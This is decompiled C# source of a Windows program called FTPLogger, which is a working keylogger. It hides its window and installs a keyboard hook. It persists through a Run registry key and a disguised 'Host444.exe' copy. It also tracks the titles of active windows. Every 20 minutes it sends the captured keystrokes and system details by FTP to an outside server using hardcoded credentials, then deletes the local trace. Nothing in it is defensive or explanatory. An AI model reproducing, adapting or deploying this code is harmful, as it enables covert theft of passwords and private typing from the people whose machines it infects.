using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace FTPLogger;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox richTextBox_0;

	private string string_0;

	private string string_1;

	[AccessedThroughProperty("kHook")]
	private GClass0 gclass0_0;

	private int int_0;

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		vmethod_9(new GClass0());
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new TextBox());
		vmethod_7(new RichTextBox());
		((Control)this).SuspendLayout();
		vmethod_0().set_Enabled(true);
		vmethod_0().set_Interval(1200000);
		vmethod_2().set_Enabled(true);
		vmethod_2().set_Interval(300);
		TextBox obj = vmethod_4();
		Point location = new Point(2, 3);
		((Control)obj).set_Location(location);
		((Control)vmethod_4()).set_Name("TextBox1");
		((TextBoxBase)vmethod_4()).set_ReadOnly(true);
		TextBox obj2 = vmethod_4();
		Size size = new Size(194, 20);
		((Control)obj2).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(0);
		RichTextBox obj3 = vmethod_6();
		location = new Point(2, 24);
		((Control)obj3).set_Location(location);
		((Control)vmethod_6()).set_Name("RichTextBox1");
		((TextBoxBase)vmethod_6()).set_ReadOnly(true);
		RichTextBox obj4 = vmethod_6();
		size = new Size(195, 71);
		((Control)obj4).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(1);
		vmethod_6().set_Text(string.Empty);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.White);
		size = new Size(199, 108);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DebuggerNonUserCode]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Timer timer_2)
	{
		EventHandler eventHandler = method_1;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(Timer timer_2)
	{
		EventHandler eventHandler = method_2;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_4()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(TextBox textBox_1)
	{
		EventHandler eventHandler = method_3;
		if (textBox_0 != null)
		{
			((Control)textBox_0).remove_TextChanged(eventHandler);
		}
		textBox_0 = textBox_1;
		if (textBox_0 != null)
		{
			((Control)textBox_0).add_TextChanged(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_6()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_7(RichTextBox richTextBox_1)
	{
		richTextBox_0 = richTextBox_1;
	}

	[DebuggerNonUserCode]
	private virtual GClass0 vmethod_8()
	{
		return gclass0_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	private virtual void vmethod_9(GClass0 gclass0_1)
	{
		GClass0.GDelegate0 gdelegate0_ = method_0;
		if (gclass0_0 != null)
		{
			GClass0.smethod_1(gdelegate0_);
		}
		gclass0_0 = gclass0_1;
		if (gclass0_0 != null)
		{
			GClass0.smethod_0(gdelegate0_);
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetActiveWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindowTextA(long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, long long_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA_1(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(long long_0);

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		vmethod_8().method_2();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		string location = Assembly.GetExecutingAssembly().Location;
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("WindowsHosting", folderPath + "\\Host444.exe");
			registryKey.Close();
			File.Copy(location, folderPath + "\\Host444.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				File.Copy(location, folderPath2 + "\\Host444.exe");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		vmethod_8().method_0();
	}

	private void method_0(Keys keys_0)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = vmethod_6();
		val.set_Text(val.get_Text() + vmethod_8().method_3(keys_0));
	}

	private void method_1(object sender, EventArgs e)
	{
		try
		{
			VBMath.Randomize();
			Random random = new Random();
			string text = Conversions.ToString(random.Next(1, 100000));
			string environmentVariable = Environment.GetEnvironmentVariable("temp");
			vmethod_6().set_Text("Username: " + SystemInformation.get_UserName() + "\r\nComputer: " + Environment.MachineName + "\r\nCountry/Region: " + ((ServerComputer)Class1.smethod_0()).get_Info().get_InstalledUICulture().ToString() + "\r\nOperating System: " + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName() + "\r\n\r\n<---Keylog--->\r\n\r\n" + vmethod_6().get_Text());
			string_1 = environmentVariable + "\\" + text + ".txt";
			string_0 = text + ".txt";
			if (File.Exists(string_1))
			{
				File.Delete(string_1);
			}
			StreamWriter streamWriter = new StreamWriter(string_1);
			string[] lines = ((TextBoxBase)vmethod_6()).get_Lines();
			foreach (string value in lines)
			{
				streamWriter.WriteLine(value);
			}
			streamWriter.Close();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://ftp.vosi.biz/" + string_0);
			ftpWebRequest.Credentials = new NetworkCredential("zombiehacker", "zombiehacker12345");
			ftpWebRequest.Method = "STOR";
			byte[] array = File.ReadAllBytes(string_1);
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
			File.Delete(string_1);
			((TextBoxBase)vmethod_6()).Clear();
			Thread.Sleep(1000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string mainWindowTitle = default(string);
		int windowTextLengthA = default(int);
		IntPtr foregroundWindow = default(IntPtr);
		string string_ = default(string);
		int int_ = default(int);
		Process processById = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 361:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 5:
						case 6:
							goto IL_0024;
						case 7:
							goto IL_0032;
						case 8:
							goto IL_0043;
						case 9:
							goto IL_0051;
						case 10:
							goto IL_0057;
						case 11:
							goto IL_0063;
						case 13:
						case 14:
							goto IL_0070;
						case 15:
							goto IL_007c;
						case 17:
						case 18:
							goto IL_0088;
						case 19:
							goto IL_0093;
						case 20:
							goto IL_009e;
						case 21:
							goto IL_00aa;
						case 22:
							goto IL_00ad;
						case 23:
							goto IL_00b8;
						case 24:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 12:
						case 16:
						case 25:
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00b8:
					num = 23;
					if (Operators.CompareString(mainWindowTitle, string.Empty, false) == 0)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_00ad:
					num = 22;
					windowTextLengthA.ToString();
					goto IL_00b8;
					IL_0008:
					num = 2;
					foregroundWindow = GetForegroundWindow();
					goto IL_0010;
					IL_0010:
					num = 3;
					if (foregroundWindow == IntPtr.Zero)
					{
						goto end_IL_0000_3;
					}
					goto IL_0024;
					IL_0024:
					num = 6;
					windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
					goto IL_0032;
					IL_0032:
					num = 7;
					string_ = Strings.StrDup(checked(windowTextLengthA + 1), "*");
					goto IL_0043;
					IL_0043:
					num = 8;
					GetWindowTextA_1(foregroundWindow, ref string_, checked(windowTextLengthA + 1));
					goto IL_0051;
					IL_0051:
					num = 9;
					int_ = 0;
					goto IL_0057;
					IL_0057:
					num = 10;
					GetWindowThreadProcessId(foregroundWindow, ref int_);
					goto IL_0063;
					IL_0063:
					num = 11;
					if (int_ == 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_0070;
					IL_0070:
					num = 14;
					processById = Process.GetProcessById(int_);
					goto IL_007c;
					IL_007c:
					num = 15;
					if (processById == null)
					{
						goto end_IL_0000_3;
					}
					goto IL_0088;
					IL_0088:
					num = 18;
					int_.ToString();
					goto IL_0093;
					IL_0093:
					num = 19;
					_ = processById.ProcessName;
					goto IL_009e;
					IL_009e:
					num = 20;
					mainWindowTitle = processById.MainWindowTitle;
					goto IL_00aa;
					IL_00aa:
					num = 21;
					goto IL_00ad;
					end_IL_0000_2:
					break;
				}
				num = 24;
				vmethod_4().set_Text("<New Window[\"" + mainWindowTitle + "\"]>");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 361;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		RichTextBox val = vmethod_6();
		val.set_Text(val.get_Text() + "\r\n\r\n" + vmethod_4().get_Text() + "\r\n");
	}
}
